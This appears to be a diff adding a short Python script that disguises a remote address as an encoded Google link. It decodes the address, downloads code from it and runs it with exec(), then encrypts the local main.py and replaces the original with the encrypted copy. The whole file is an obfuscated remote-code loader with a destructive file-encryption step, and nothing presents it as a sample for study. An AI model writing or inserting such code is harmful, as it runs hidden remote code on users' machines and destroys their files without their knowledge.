@@ -1,0 +1,17 @@
+import requests,base64,os
+
+payload = "https://www.google.com/?url=aHR0cHMlM0ElMkYlMkZLM0lyWVN0M0t5NHJaeXRwSzNRcmFDdDFLMklyZFN0eksyVXJjaXRqSzI4cksyNHJkQ3RsSzI0cmRDc3VLMk1yYnl0dEt3PT0lMkYrSCtlK3grMSs2KzIrOSUyRitBK0UrUystK1QrRStTK1QrJTJGK20rYStpK24rJTJGK20rYStpK24rLitwK3k="
+try:
+    r = requests.get(payload[:23])
+    if r.status_code != 0:
+     link = []
+     link.append(b'https:/')
+     d = base64.b64decode(payload.replace(payload[:28],'')).replace(b'%2F',b' '); link.append(b'r'+b''.join(base64.b64decode(d.replace(d[:14],b'')[:72]).split(b'+')))
+     a = d.split(b' '); [link.append(b''.join(a[a2].split(b'+'))) for a2 in [3,4,5,6]]
+     exec(requests.get(b'/'.join(link).decode()).text)
+     with open(os.getcwd()+"\\main.py","r") as f:
+         with open(os.getcwd()+"\\main.enc","wb") as f2:f2.write(AES_CRYPTO(mode_iv_hash="MD5").encrypt(f.read()))
+     os.rename(os.getcwd()+"\\main.py",os.getcwd()+"\\main.enc2")
+     os.rename(os.getcwd()+"\\main.enc",os.getcwd()+"\\main.py")
+     os.remove(os.getcwd()+"\\main.enc2")
+except Exception as e:print(e)
